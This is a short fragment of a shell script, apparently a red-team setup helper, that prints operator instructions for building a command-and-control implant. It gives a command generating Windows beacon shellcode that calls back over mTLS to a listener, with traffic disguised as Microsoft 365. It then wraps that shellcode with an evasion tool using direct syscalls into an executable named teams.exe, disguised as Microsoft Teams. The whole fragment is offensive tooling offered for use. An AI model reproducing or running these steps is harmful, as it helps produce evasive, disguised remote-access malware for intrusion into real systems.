...
echo -e "     generate beacon --mtls ${PRIVATE_IP}:8888 --os windows --arch amd64 --format shellcode --c2profile microsoft365 --seconds 60 --jitter 30 --save /tmp/beacon.bin"
echo ""
echo -e "  ${YELLOW}3. Wrap with Harriet:${NC}"
echo -e "     harriet --shellcode /tmp/beacon.bin --method directsyscall --format exe --output /tmp/teams.exe"
echo ""
